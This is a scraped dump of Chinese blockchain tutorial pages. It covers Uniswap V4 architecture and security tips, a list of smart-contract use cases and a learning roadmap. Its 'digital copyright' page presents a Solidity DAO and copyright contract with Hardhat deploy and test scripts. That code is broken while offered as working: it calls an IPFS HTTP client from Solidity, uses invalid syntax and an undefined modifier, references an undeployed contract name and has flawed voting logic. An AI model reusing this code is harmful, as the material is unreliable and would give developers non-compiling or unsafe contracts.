}\n \n    function invariant_StateConsistency() public {\n        // 状态一致性检查\n        // ...测试逻辑\n    }\n}\n\n7. 安全建议总结\n7.1 开发流程建议\ngraph LR\n    A[需求分析] --&gt; B[架构设计]\n    B --&gt; C[安全设计]\n    C --&gt; D[实现编码]\n    D --&gt; E[单元测试]\n    E --&gt; F[集成测试]\n    F --&gt; G[安全审计]\n    G --&gt; H[漏洞修复]\n    H --&gt; I[部署上线]\n    I --&gt; J[监控应急]\n\n    style C fill:#c8e6c9\n    style G fill:#ffcdd2\n\n7.2 安全建议清单\n开发阶段：\n\n✅ 使用安全的Hook模板\n✅ 添加完整的访问控制\n✅ 实现重入保护\n✅ 记录详细的事件日志\n✅ 编写全面的测试\n\n审计阶段：\n\n✅ 使用静态分析工具\n✅ 进行模糊测试\n✅ 邀请专业审计\n✅ 进行形式化验证\n✅ 测试边界条件\n\n部署阶段：\n\n✅ 多签控制升级权限\n✅ 设置时间锁\n✅ 准备应急方案\n✅ 配置监控告警\n✅ 准备漏洞响应计划\n\n\n8. 系列总结\n8.1 V4核心创新回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n创新描述优势Hooks生命周期可编程无限扩展性Singleton单例架构部署成本↓95%Flash Accounting瞬时会计Gas优化30-40%Native ETH原生支持Gas节省47%动态费用自定义费率精细化定价\n8.2 学习路径\nflowchart LR\n    A[基础理解&lt;br/&gt;01-概述] --&gt; B[核心机制&lt;br/&gt;02-Hooks&lt;br/&gt;03-单例架构]\n    B --&gt; C[深入细节&lt;br/&gt;04-交换流程&lt;br/&gt;05-费用系统]\n    C --&gt; D[高级特性&lt;br/&gt;06-账户抽象]\n    D --&gt; E[安全实践&lt;br/&gt;07-安全分析]\n    E --&gt; F[实践开发&lt;br/&gt;构建实际项目]\n\n    style F fill:#c8e6c9\n\n8.3 继续学习资源\n官方资源：\n\nUniswap V4 白皮书\nUniswap V4 Core 源码\nUniswap V4 Periphery\n\n社区资源：\n\nUniswap Discord\nUniswap 论坛\nV4 Hooks 示例\n\n开发工具：\n\nFoundry Book\nSlither 文档\nOpenZeppelin 合约\n\n\n感谢阅读\n感谢您阅读「死磕Uniswap V4」系列文章。希望这些内容能帮助您深入理解Uniswap V4的技术架构，并在实际开发中应用这些知识。\n如果您有任何问题或建议，欢迎通过以下方式联系：\n\n提交 Issue\n发送 Pull Request\n参与 Discord 讨论\n\n祝您在DeFi开发之旅中一切顺利！\n\n参考资料\n\nUniswap V4 Core - PoolManager.sol\nUniswap V4 Core - IHooks.sol\nSmart Contract Security Best Practices\nSWC Registry\nEthereum Smart Contract Best Practices\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/README":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/README","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/README.md","title":"README","links":[],"tags":[],"content":"死磕Uniswap V4\n\n深入解析Uniswap V4的核心技术与架构创新\n\n系列概述\n本系列文章深入剖析Uniswap V4的技术架构，从核心设计理念到实现细节，全面解析V4相比V3的革命性改进。\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容状态01V4概述与架构革命Singleton、Hooks、Flash Accounting📝02Hooks机制深度解析Hook接口、生命周期、实现模式📝03单例架构与瞬时会计PoolManager、Currency、Accounting📝04交换流程与Hook执行时序swap函数、Hook调用链、Gas分析📝05费用系统与动态费率自定义费率、动态调整、费用分配📝06账户抽象与原生ETHCurrency类型、settle/take、批量操作📝07安全分析与最佳实践Hook安全、MEV防护、审计要点📝\nV4 vs V3 核心差异\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性Uniswap V3Uniswap V4架构每池一合约单例Singleton扩展性固定功能Hooks可编程费率固定等级任意动态费率转账即时转账瞬时会计ETH需要WETH原生支持创建成本高 (~$500+)低 (~$10)Gas效率基准降低约30-40%\n核心创新点\n1. Hooks（钩子机制）\nHooks是V4的核心创新，允许开发者在池子生命周期的关键点插入自定义逻辑：\nflowchart LR\n    subgraph Hook生命周期\n        Initialize[初始化]\n        ModifyPosition[修改头寸]\n        Swap[交换]\n        Donate[捐赠]\n    end\n\n    Initialize --&gt;|before/after| Hook[自定义逻辑]\n    ModifyPosition --&gt;|before/after| Hook\n    Swap --&gt;|before/after| Hook\n    Donate --&gt;|before/after| Hook\n\n可用Hook函数：\n\nbeforeInitialize / afterInitialize\nbeforeModifyPosition / afterModifyPosition\nbeforeSwap / afterSwap\nbeforeDonate / afterDonate\n\n2. Singleton（单例架构）\n所有池子合并到一个合约中，大幅降低部署和交互成本：\ncontract PoolManager {\n    // 所有池子的状态\n    mapping(bytes32 poolId =&gt; Pool.State) pools;\n    mapping(bytes32 poolId =&gt; Pool.Slot0) slot0s;\n    // ...\n}\n3. Flash Accounting（瞬时会计）\n延迟转账机制，在交易结束时统一结算差额：\nsequenceDiagram\n    participant User\n    participant Pool as PoolManager\n    participant Hook\n\n    User-&gt;&gt;Pool: swap()\n    Pool-&gt;&gt;Pool: 记录deltas[user]\n    Pool-&gt;&gt;Hook: beforeSwap()\n    Pool-&gt;&gt;Pool: 执行交换逻辑\n    Pool-&gt;&gt;Hook: afterSwap()\n    Pool-&gt;&gt;Pool: 验证deltas平衡\n    Pool-&gt;&gt;User: settle/take 结算\n\n4. Native ETH\n直接支持ETH，无需WETH包装：\ntype Currency is address;\n \naddress(0)    = Native ETH\naddress(token) = ERC20 Token\n5. 动态费用\n通过Hooks实现任意费率模型：\n// 动态费率Hook示例\nfunction beforeSwap(...) external returns (bytes4, int256, int256) {\n    uint256 volatility = calculateVolatility();\n    uint16 dynamicFee = baseFee + volatility * multiplier;\n    pools[poolId].hookFee = dynamicFee - baseFee;\n    return (IHooks.beforeSwap.selector, 0, 0);\n}\n学习路径\n建议按顺序阅读本系列文章：\n\n入门: 先阅读「01-V4概述与架构革命」，了解整体架构\n核心: 深入「02-Hooks机制」和「03-单例架构与瞬时会计」\n进阶: 学习「04-交换流程」和「05-费用系统」\n实践: 掌握「06-账户抽象」和「07-安全最佳实践」\n\n技术栈\n\nSolidity: ^0.8.20\nFoundry: 测试框架\nOpenZeppelin: 标准库\nVyper: Hook可选语言\n\n参考资料\n\nUniswap V4 Whitepaper\nUniswap V4 Core Code\nUniswap V4 Hooks Doc\n\n贡献\n欢迎提交Issue和Pull Request来完善本系列文档。\n许可证\nMIT License"},"blockchainguide/DApp_Development/应用场景/defi/永续期货合约":{"slug":"blockchainguide/DApp_Development/应用场景/defi/永续期货合约","filePath":"blockchainguide/DApp_Development/应用场景/defi/永续期货合约.md","title":"永续期货合约","links":[],"tags":[],"content":"github.com/Binance-docs/binance-coin-margined-futures"},"blockchainguide/DApp_Development/应用场景/nft/动态NFT":{"slug":"blockchainguide/DApp_Development/应用场景/nft/动态NFT","filePath":"blockchainguide/DApp_Development/应用场景/nft/动态NFT.md","title":"动态NFT","links":[],"tags":[],"content":""},"blockchainguide/DApp_Development/应用场景/数字版权保护/数字版权保护":{"slug":"blockchainguide/DApp_Development/应用场景/数字版权保护/数字版权保护","filePath":"blockchainguide/DApp_Development/应用场景/数字版权保护/数字版权保护.md","title":"数字版权保护","links":["tags/测试脚本"],"tags":["测试脚本"],"content":"pragma solidity ^0.8.0;\n \n// 引入IPFS库\nimport &quot;ipfs-http-client&quot;;\n \n// DAO合约\ncontract DAO {\n    // DAO成员的地址列表\n    address[] public members;\n    // DAO成员的投票权重\n    mapping (address =&gt; uint256) public votingPower;\n    // 投票记录\n    mapping (address =&gt; mapping (uint256 =&gt; bool)) public voteRecords;\n    // 成员总数\n    uint256 public totalMembers;\n    // 最小投票权重\n    uint256 public minVotingPower;\n    // 最大投票权重\n    uint256 public maxVotingPower;\n    // 投票持续时间\n    uint256 public votingDuration;\n    // 投票开始时间\n    uint256 public votingStartTime;\n    // 投票结束时间\n    uint256 public votingEndTime;\n    // 投票结果\n    uint256 public votingResult;\n    // 投票主题\n    string public votingSubject;\n    // 投票内容\n    string public votingContent;\n \n    // 构造函数，初始化DAO成员列表和投票权重\n    constructor() {\n        members.push(msg.sender);\n        votingPower[msg.sender] = 1;\n        totalMembers = 1;\n        minVotingPower = 1;\n        maxVotingPower = 1;\n        votingDuration = 1 days;\n    }\n \n    // 修饰器，只有DAO成员才能执行的操作\n    modifier onlyMember() {\n        require(votingPower[msg.sender] &gt; 0, &quot;Only member can perform this operation.&quot;);\n        _;\n    }\n \n    // 添加成员\n    function addMember(address _member, uint256 _votingPower) public onlyMember {\n        require(votingPower[_member] == 0, &quot;Member already exists.&quot;);\n        require(_votingPower &gt;= minVotingPower &amp;&amp; _votingPower &lt;= maxVotingPower, &quot;Invalid voting power.&quot;);\n        members.push(_member);\n        votingPower[_member] = _votingPower;\n        totalMembers += 1;\n    }\n \n    // 删除成员\n    function removeMember(address _member) public onlyMember { require(votingPower[_member] &gt; 0, &quot;Member does not exist.&quot;); delete votingPower[_member]; for (uint256 i = 0; i &lt; members.length; i++) { if (members[i] == _member) { members[i] = members[members.length - 1]; members.pop(); totalMembers -= 1; break; } } }\n \n// 更新成员投票权重\nfunction updateMemberVotingPower(address _member, uint256 _votingPower) public onlyMember {\n    require(votingPower[_member] &gt; 0, &quot;Member does not exist.&quot;);\n    require(_votingPower &gt;= minVotingPower &amp;&amp; _votingPower &lt;= maxVotingPower, &quot;Invalid voting power.&quot;);\n    votingPower[_member] = _votingPower;\n}\n \n// 设置最小投票权重\nfunction setMinVotingPower(uint256 _minVotingPower) public onlyMember {\n    require(_minVotingPower &lt; maxVotingPower, &quot;Invalid min voting power.&quot;);\n    minVotingPower = _minVotingPower;\n}\n \n// 设置最大投票权重\nfunction setMaxVotingPower(uint256 _maxVotingPower) public onlyMember {\n    require(_maxVotingPower &gt; minVotingPower, &quot;Invalid max voting power.&quot;);\n    maxVotingPower = _maxVotingPower;\n}\n \n// 设置投票持续时间\nfunction setVotingDuration(uint256 _votingDuration) public onlyMember {\n    votingDuration = _votingDuration;\n}\n \n// 开始投票\nfunction startVoting(string memory _votingSubject, string memory _votingContent) public onlyMember {\n    require(votingEndTime == 0, &quot;Voting already in progress.&quot;);\n    votingSubject = _votingSubject;\n    votingContent = _votingContent;\n    votingStartTime = block.timestamp;\n    votingEndTime = votingStartTime + votingDuration;\n    votingResult = 0;\n}\n \n// 取消投票\nfunction cancelVoting() public onlyMember {\n    require(votingEndTime &gt; 0, &quot;No voting in progress.&quot;);\n    votingSubject = &quot;&quot;;\n    votingContent = &quot;&quot;;\n    votingStartTime = 0;\n    votingEndTime = 0;\n    votingResult = 0;\n}\n \n// 投票\n  function vote(uint256 _vote) public onlyMember { require(votingEndTime &gt; 0, &quot;No voting in progress.&quot;); require(!voteRecords[msg.sender][_vote], &quot;Already voted.&quot;); voteRecords[msg.sender][_vote] = true; votingResult += votingPower[msg.sender] * _vote; }\n \n// 结束投票\nfunction endVoting() public onlyMember {\n    require(votingEndTime &gt; 0, &quot;No voting in progress.&quot;);\n    require(block.timestamp &gt;= votingEndTime, &quot;Voting not yet ended.&quot;);\n    votingEndTime = 0;\n}\n \n// 获取投票结果\nfunction getVotingResult() public view returns (uint256) {\n    require(votingEndTime == 0, &quot;Voting still in progress.&quot;);\n    return votingResult;\n}\n}\n \n// 用于数字版权保护的智能合约 contract DigitalCopyright {\n \n// 版权拥有者的地址\naddress public owner;\n \n// DAO合约地址\naddress public dao;\n \n// IPFS客户端\nIpfsHttpClient ipfs;\n \n// 版权信息结构体\nstruct Copyright {\n    string name; // 版权名称\n    string symbol; // 版权符号\n    string description; // 版权描述\n    string contentHash; // 版权内容的哈希值\n    uint256 createTime; // 版权创建时间\n    uint256 updateTime; // 版权更新时间\n    bool active; // 版权是否激活\n}\n \n// 存储所有版权信息的映射表\nmapping(string =&gt; Copyright) public copyrights;\n \n// 构造函数，初始化合约拥有者为合约创建者，并且初始化IPFS客户端\nconstructor() {\n    owner = msg.sender;\n    ipfs = IpfsHttpClient(&quot;http://localhost:5001&quot;);\n}\n \n// 修饰器，只有版权拥有者或DAO成员才能执行的操作\nmodifier onlyOwnerOrMember() {\n    require(msg.sender == owner || DAO(dao).votingPower(msg.sender) &gt; 0, &quot;Only owner or member can perform this operation.&quot;);\n    _;\n}\n \n// 创建版权信息\nfunction createCopyright(string memory _name, string memory _symbol, string memory _description, string memory _content) public onlyOwnerOrMember { require(!copyrights[_name].active, &quot;Copyright already exists.&quot;); uint256 _createTime = block.timestamp; uint256 _updateTime = block.timestamp; bool _active = true;\n \n    // 将版权内容上传到IPFS，并获取哈希值\n    bytes memory contentBytes = bytes(_content);\n    (bytes32 contentHashBytes32, ) = ipfs.add(contentBytes);\n    string memory contentHash = bytes32ToString(contentHashBytes32);\n \n    // 创建版权信息\n    Copyright memory newCopyright = Copyright({\n        name: _name,\n        symbol: _symbol,\n        description: _description,\n        contentHash: contentHash,\n        createTime: _createTime,\n        updateTime: _updateTime,\n        active: _active\n    });\n    copyrights[_name] = newCopyright;\n}\n \n// 更新版权信息\nfunction updateCopyright(string memory _name, string memory _symbol, string memory _description, string memory _content) public onlyOwnerOrMember {\n    require(DAO(dao).votingEndTime() == 0, &quot;Voting in progress.&quot;);\n    require(DAO(dao).getVotingResult() &gt; DAO(dao).totalMembers() / 2, &quot;Voting not approved.&quot;);\n    require(DAO(dao).voteRecords(msg.sender, 1) || msg.sender == owner, &quot;No permission.&quot;);\n    require(DAO(dao).votingSubject() == _name, &quot;Wrong voting subject.&quot;);\n    require(DAO(dao).votingContent() == _content, &quot;Wrong voting content.&quot;);\n    require(DAO(dao).votingEndTime() &gt; 0, &quot;No voting in progress.&quot;);\n    require(DAO(dao).votingEndTime() &lt;= block.timestamp, &quot;Voting not yet ended.&quot;);\n \n    // 将版权内容上传到IPFS，并获取哈希值\n    bytes memory contentBytes = bytes(_content);\n    (bytes32 contentHashBytes32, ) = ipfs.add(contentBytes);\n    string memory contentHash = bytes32ToString(contentHashBytes32);\n \n    // 更新版权信息\n    Copyright storage copyrightToUpdate = copyrights[_name];\n    copyrightToUpdate.symbol = _symbol;\n    copyrightToUpdate.description = _description;\n    copyrightToUpdate.contentHash = contentHash;\n    copyrightToUpdate.updateTime = block.timestamp;\n}\n \n// 停用版权信息\nfunction deactivateCopyright(string memory _name) public onlyOwnerOrMember {\n    require(DAO(dao).votingEndTime() == 0, &quot;Voting in progress.&quot;); require(DAO(dao).getVotingResult() &gt; DAO(dao).totalMembers() / 2, &quot;Voting not approved.&quot;); require(DAO(dao).voteRecords(msg.sender, 1) || msg.sender == owner, &quot;No permission.&quot;); require(DAO(dao).votingSubject() == _name, &quot;Wrong voting subject.&quot;); require(DAO(dao).votingContent() == &quot;&quot;, &quot;Wrong voting content.&quot;); require(DAO(dao).votingEndTime() &gt; 0, &quot;No voting in progress.&quot;); require(DAO(dao).votingEndTime() &lt;= block.timestamp, &quot;Voting not yet ended.&quot;); Copyright storage copyrightToDeactivate = copyrights[_name]; copyrightToDeactivate.active = false; }\n \n// 激活版权信息\nfunction activateCopyright(string memory _name) public onlyOwnerOrMember {\n    require(DAO(dao).votingEndTime() == 0, &quot;Voting in progress.&quot;);\n    require(DAO(dao).getVotingResult() &gt; DAO(dao).totalMembers() / 2, &quot;Voting not approved.&quot;);\n    require(DAO(dao).voteRecords(msg.sender, 1) || msg.sender == owner, &quot;No permission.&quot;);\n    require(DAO(dao).votingSubject() == _name, &quot;Wrong voting subject.&quot;);\n    require(DAO(dao).votingContent() == &quot;&quot;, &quot;Wrong voting content.&quot;);\n    require(DAO(dao).votingEndTime() &gt; 0, &quot;No voting in progress.&quot;);\n    require(DAO(dao).votingEndTime() &lt;= block.timestamp, &quot;Voting not yet ended.&quot;);\n    Copyright storage copyrightToActivate = copyrights[_name];\n    copyrightToActivate.active = true;\n}\n \n// 获取版权信息\nfunction getCopyright(string memory _name) public view returns (string memory, string memory, string memory, string memory, uint256, uint256, bool) {\n    require(msg.sender == owner || DAO(dao).getVotingResult() &gt; DAO(dao).totalMembers() / 2 || DAO(dao).voteRecords(msg.sender, 1), &quot;No permission.&quot;);\n    Copyright memory c = copyrights[_name];\n \n    // 从IPFS获取版权内容\n    bytes32 contentHashBytes32 = stringToBytes32(c.contentHash);\n    bytes memory contentBytes = ipfs.cat(contentHashBytes32); string memory content = string(contentBytes); return (c.name, c.symbol, c.description, content, c.createTime, c.updateTime, c.active); }\n \n// 设置DAO合约地址\nfunction setDAO(address _dao) public onlyOwner {\n    dao = _dao;\n}\n \n// 转换为字符串\nfunction bytes32ToString(bytes32 _bytes32) internal pure returns (string memory) {\n    bytes memory bytesArray = new bytes(64);\n    for (uint256 i = 0; i &lt; 32; i++) {\n        bytesArray[i*2] = byte(hex(uint8(_bytes32[i] &gt;&gt; 4))));\n        bytesArray[i*2+1] = byte(hex(uint8(_bytes32[i] &amp; 0x0f))));\n    }\n    return string(bytesArray);\n}\n \n// 将字符串转换为bytes32\nfunction stringToBytes32(string memory _string) internal pure returns (bytes32) {\n    bytes32 result;\n    assembly {\n        result := mload(add(_string, 32))\n    }\n    return result;\n}\n}\nBush脚本\nconst { ethers } = require(&quot;hardhat&quot;);\n \nasync function main() {\n  // 部署DAO合约\n  const DAO = await ethers.getContractFactory(&quot;DAO&quot;);\n  const dao = await DAO.deploy();\n \n  // 部署数字版权保护合约，并设置DAO合约地址\n  const DigitalCopyright = await ethers.getContractFactory(\n    &quot;DigitalCopyright&quot;\n  );\n  const copyright = await Copyright.deploy(dao.address);\n \n  // 将部署结果输出到控制台\n  console.log(&quot;DAO deployed at:&quot;, dao.address);\n  console.log(&quot;DigitalCopyright deployed at:&quot;, copyright.address);\n}\n \nmain()\n  .then(() =&gt; process.exit(0))\n  .catch((error) =&gt; {\n    console.error(error);\n    process.exit(1);\n  });\n测试脚本\nconst { expect } = require(&quot;chai&quot;);\n \ndescribe(&quot;DigitalCopyright&quot;, function () {\n  let dao, copyright, owner, member1;\n \n  before(async function () {\n    // 获取所有账户\n    const [deployer, account1, account2] = await ethers.getSigners();\n    owner = deployer;\n    member1 = account1;\n \n    // 部署DAO合约\n    const DAO = await ethers.getContractFactory(&quot;DAO&quot;);\n    dao = await DAO.deploy();\n \n    // 部署数字版权保护合约，并设置DAO合约地址\n    const Copyright = await ethers.getContractFactory(\n      &quot;DigitalCopyright&quot;\n    );\n    copyright = await Copyright.deploy(dao.address);\n \n    // 添加成员\n    await dao.addMember(member1.address, 1);\n  });\n \n  it(&quot;should create a new copyright&quot;, async function () {\n    // 创建一个新的版权信息\n    await copyright.createCopyright(\n      &quot;test&quot;,\n      &quot;T&quot;,\n      &quot;test description&quot;,\n      &quot;test content&quot;\n    );\n \n    // 获取版权信息\n    const result = await copyright.getCopyright(&quot;test&quot;);\n \n    // 验证版权信息是否正确\n    expect(result[0]).to.equal(&quot;test&quot;);\n    expect(result[1]).to.equal(&quot;T&quot;);\n    expect(result[2]).to.equal(&quot;testdescription&quot;); expect(result[3]).to.equal(&quot;test content&quot;); }); });\n以上测试脚本仅包含了一个测试用例，用于创建一个新的版权信息并验证其内容是否正确。在进行测试前，需要先启动本地节点，可以使用以下命令启动节点：\n\nnpx hardhat node\n然后再运行测试脚本，可以使用以下命令运行测试：\n\nnpx hardhat test\n注意，在使用Hardhat进行部署和测试时，需要先在项目根目录下创建一个名为 `hardhat.config.js` 的配置文件，用于配置网络和编译器设置等信息。例如，以下是一个基本的配置文件示例：\n\nmodule.exports = { solidity: “0.8.0”, networks: { development: { url: “http://localhost:8545”, accounts: [privateKey1, privateKey2, …], }, rinkeby: { url: “rinkeby.infura.io/v3/”, accounts: [privateKey], }, }, };\n其中，`solidity` 字段用于指定使用的Solidity编译器版本，`networks` 字段用于配置网络设置，例如本地开发网络和测试网络等。在部署和测试合约时，会根据配置文件中指定的网络进行操作。\n"},"blockchainguide/DApp_Development/应用场景/智能合约可能的业务方向":{"slug":"blockchainguide/DApp_Development/应用场景/智能合约可能的业务方向","filePath":"blockchainguide/DApp_Development/应用场景/智能合约可能的业务方向.md","title":"智能合约可能的业务方向","links":[],"tags":[],"content":"智能合约是一种自动执行的计算机程序，它被编写在区块链上，可以帮助人们在没有中间人干扰的情况下进行透明、安全和可靠的交易。随着区块链技术的发展，智能合约在互联网行业中的应用场景越来越广泛。本文将详细描述智能合约在互联网行业中的各种场景。\n一、电子商务场景\n1、在线支付\n智能合约可以被用来处理在线支付，使得买卖双方能够在没有中间人的情况下安全、快速地完成交易。例如，当用户在某个电商平台上购买商品时，智能合约可以自动将付款从买家的钱包中转移到卖家的钱包中，同时验证交易是否符合双方的要求。\n2、供应链管理\n智能合约可以被用来管理供应链，使得全球各地的供应商和客户能够实现无缝的沟通和协作。例如，当某个物流公司需要从一家供应商处采购原材料时，智能合约可以自动协调采购、运输和支付等环节，从而实现供应链的自动化管理。\n3、数字版权保护\n智能合约可以被用来保护数字版权，使得创作者能够更好地保护自己的作品不被盗版或侵权。例如，当某个创作者发布了一部电影或音乐作品时，智能合约可以自动记录版权信息，从而防止他人未经许可地使用这些作品。\n二、金融服务场景\n1、数字货币交易\n智能合约可以被用来处理数字货币交易，使得交易更加安全、快速和透明。例如，当用户需要在加密货币交易平台上购买某个数字资产时，智能合约可以自动处理交易，从而确保交易的合法性和安全性。\n2、借贷和投资\n智能合约可以被用来管理借贷和投资，使得借贷和投资过程更加透明、自动化和安全。例如，当某个用户需要借款时，智能合约可以自动处理借款和还款等环节，从而减少人为干预和错误。\n3、保险理赔\n智能合约可以被用来管理保险理赔，使得理赔过程更加公正、快速和自动化。例如，当某个用户需要进行理赔时，智能合约可以自动处理理赔申请、审核和赔付等环节，从而提高用户体验和保险公司的效率。\n三、医疗健康场景\n1、健康数据管理\n智能合约可以被用来管理个人健康数据，使得个人健康数据更加安全、私密和透明。例如，当某个患者需要将自己的健康数据存储在区块链上时，智能合约可以自动处理数据存储和访问权限等环节，从而保护患者的隐私和权益。\n2、医疗资源调配\n智能合约可以被用来管理医疗资源的调配，使得医疗资源的分配更加公平、高效和自动化。例如，当某个医院需要调配医疗资源时，智能合约可以自动处理资源调配和交易等环节，从而提高医疗资源的利用率和医疗服务的质量。\n3、药品追溯管理\n智能合约可以被用来管理药品的追溯和溯源，使得药品的来源和流通更加透明、可信和安全。例如，在药品的生产、运输和销售环节中，智能合约可以自动记录药品的信息和流向，从而保证药品的质量和安全。\n四、物联网场景\n1、智能家居管理\n智能合约可以被用来管理智能家居设备，使得设备的控制更加智能、自动化和安全。例如，当用户需要控制智能家居设备时，智能合约可以自动处理设备的控制和数据传输等环节，从而提高用户的生活体验。\n2、智能物流管理\n智能合约可以被用来管理智能物流设备，使得物流的运输和交付更加智能、自动化和高效。例如，在物流的运输和交付环节中，智能合约可以自动处理运输和交付的序列、时间和地点等信息，从而实现物流的智能管理和优化。\n3、智能能源管理\n智能合约可以被用来管理智能能源设备，使得能源的生产和消费更加智能、自动化和节能。例如，在能源的生产和消费环节中，智能合约可以自动处理能源的生产、储存和消费等信息，从而实现能源的智能管理和优化。\n五、社交媒体场景\n1、数字身份管理\n智能合约可以被用来管理数字身份，使得用户的身份和数据更加安全、私密和可信。例如，在社交媒体平台上，智能合约可以自动记录用户的身份和关注信息，从而保护用户的隐私和权益。\n2、数字内容分发\n智能合约可以被用来管理数字内容分发，使得数字内容的分发更加公正、高效和自动化。例如，在社交媒体平台上，智能合约可以自动处理数字内容的分发和版权管理等环节，从而保护内容创作者的利益和用户的体验。\n3、社交网络治理\n智能合约可以被用来管理社交网络的治理，使得社交网络的管理更加公正、透明和自动化。例如，在社交媒体平台上，智能合约可以自动处理用户的投诉、举报和封禁等事件，从而提高社交网络的公正性和管理效率。\n六、游戏娱乐场景\n1、游戏资产管理\n智能合约可以被用来管理游戏资产，使得游戏资产的交易更加安全、透明和自动化。例如，在游戏平台上，智能合约可以自动处理游戏资产的交易、转移和存储等信息，从而保护游戏玩家的利益和游戏平台的安全。\n2、游戏竞技管理\n智能合约可以被用来管理游戏竞技，使得游戏竞技更加公平、高效和自动化。例如，在游戏竞技平台上，智能合约可以自动处理比赛的规则、奖励和惩罚等信息，从而提高游戏竞技的公平性和竞技效率。\n以下是100个智能合约的应用场景：\n\n数字货币交易\n资产管理\n供应链管理\n物流管理\n食品安全追溯\n版权管理\n知识产权保护\n电子投票\n电子签名\n电子合同\n区块链游戏\n众筹\n慈善捐赠\n保险理赔\n金融衍生品交易\n货币兑换\n贸易融资\n货物质量检验\n物联网设备管理\n物联网数据交易\n网络安全监控\n人才招聘\n人事管理\n教育认证\n医疗数据管理\n医疗保险理赔\n交通违章处理\n电子身份认证\n物业管理\n公共服务管理\n政务管理\n物品租赁\n二手交易\n软件授权管理\n软件开发协议\n云计算资源管理\n人脸识别\n自动售货机管理\n智慧城市管理\n环境监测\n资源共享\n物理资产管理\n知识管理\n知识共享\n网络广告管理\n网络游戏交易\n电子商务交易\n物流运输管理\n退税管理\n企业融资\n"},"blockchainguide/DApp_Development/智能合约学习路线与资源汇总":{"slug":"blockchainguide/DApp_Development/智能合约学习路线与资源汇总","filePath":"blockchainguide/DApp_Development/智能合约学习路线与资源汇总.md","title":"智能合约学习路线与资源汇总","links":["openzeppelin/contracts"],"tags":[],"content":"以太坊学习路线和资源汇总\n笔者相对擅长合约安全方面，因此这个学习路线大致是偏向于智能合约开发和智能合约安全，对于很多从事开发的朋友，可能显得比较学院派，不是那么切合工作实际，不过抛砖引玉，欢迎讨论和补充。学习的资源可以在下方的资源汇总中找到，笔者日后将会写合约审计方面的文章。\n我们学习的心得、理论基础和源码分析，都会写在仓库里，欢迎交流学习\ngithub.com/learnerLj/geth-analyze\n这下面的内容笔者也没有完全掌握，但是会逐渐的学习，在未来 3-5 年研究生毕业后也许能够在合约安全、安全的区块链系统构建等方面有一定的成就。\n第一步：完成简单 DApp 开发\n一开始入门就要求做简单的 DApp 可能看起来不合理，因为读者可能现在都不知道 DApp 是什么。但是项目驱动的学习将会非常有效，并且掌握的开发技能将会在后续的学习中发挥重要作用。\n将会学会的知识有：\n\n编程语言：JavaScript, Solidity, (HTML, CSS)\n\n完成前端与合约交互往往用的 JavaScript 的 API，这是必会的技能。JavaScript 也不必学的多深入，能够熟练的掌握 promis/async 之类的异步操作，编写函数和类即可。学习 JavaScript 对于编写合约的测试用例和一些重复工作的自动化非常有帮助。每次实验中不可能重复部署实验环境，而是一次编写，反复实验和调整。\nSolidity 是编写智能合约最主流的语言，也将会是只能合约开发和智能合约安全的基础，是我们后续需要精通的语言。\n至于 HTML 和 CSS 本身不难，和区块链关系不大，视自身情况学习，可以弱化。\n\nLinux 的熟练使用\n\nLinux 是以太坊客户端运行的主要系统环境，因为它相对于 windows 有更完善的命令行工具，过去的许多教程也是要么基于 MacOS，要么基于 Linux。这里推荐使用 Ubuntu 20.04 长期支持版，这是用的最多的带图形交互页面的 Linux 系统。\n\n区块链入门知识\n\n市面上关于区块链的书多如牛毛，笔者在刚入门时几乎借助 掌阅、微信读书等电子书平台和学校图书馆，读遍了所有中文书籍。可惜的是，笔者发现它们的内容稂莠不齐，甚至怀疑写书的人是否真的理解他所表达的内容，要么毫无洞见，要么写成教材式的死记硬背概念，少有佳作。笔者选出几本觉得还可以的书作为入门的阅读材料。\n《精通以太坊》、《区块链架构之美——从比特币、以太坊、超级账本看区块链架构设计》《深入理解以太坊》是可以仔细阅读的，部分内容读不懂也没关系，可以会过来再读。\n《深入浅出区块链核心技术与项目分析》、《深入以太坊智能合约开发》《区块链：以太坊 DApp 开发实战》值得略读，浏览内容，了解区块链的方方面面。其中《区块链：以太坊 DApp 开发实战》的中继服务器开发，值得以后掌握 Go 语言和具有一定的源码基础后尝试实践。\n除此之外，可以阅读笔者其他的文章，会持续更新。也可以浏览下面的资源汇总，大致的看一遍，建立对区块链的模糊认识。\n\n开发框架和库\n\n实现 DApp 时交易使用 truffle 或者 hardhat 这样的集成开发框架。truffle 主要使用 web3.js 而 hardhat 主要使用 ether.js，这两个都可以，但是后者最近较为流行。\n除了 web3.js 和 ether.js 这样的用 JavaScript 编写的完整的库外，还有其他语言编写的库，如 web3j、web3.py，但是建议和所使用的框架配套。\n第二部分：深入合约开发和合约安全\n通过第一部分的学习，我们可以假设读者\n\n 能够在 Linux 命令行熟练使用框架.\n 熟悉区块链的基本概念，包括区块、合约、账户、交易池、区块生成过程、交易的核心数据部分（如 value、data)、receipt、gas、基本了解 PoS 和PoW 、最长链原则\n 掌握编写合约的主要知识，例如 receive 函数 和 fallback 函数，编写合约的测试脚本。\n 能够使用 geth 这样的客户端，搭建基本的网络\n 知道在区块浏览器上查询信息\n\n接下来开始了解区块链的相对高级的主体，注意偏向合约开发和合约安全方向：\n\n 了解 ABI 的编码方式，并且能够使用 Solidity 内置的 ABI 相关函数。\n 了解函数签名的生成方式以及在合约执行时的作用。\n 了解预言机的确切含义，以及在链上的实现方式。\n 理解以太坊虚拟机\n\n 了解交易发送到调用合约的整个过程。\n 熟悉合约中的数据在存储中的组织形式、内存的组织形式、calldata 的组织形式。\n 初步理解 Solidity 编译器的原理，能够读懂汇编\n\n\n 了解以太坊的字节码、操作码，能供单步调试，观察栈、内存的变化。\n 了解合约的内联汇编，直接操作数据。\n 根据自己的实际要求，选择是否需要熟悉各种业务代码，例如代币等等\n\n然后，阅读以太坊的源码，建议阅读 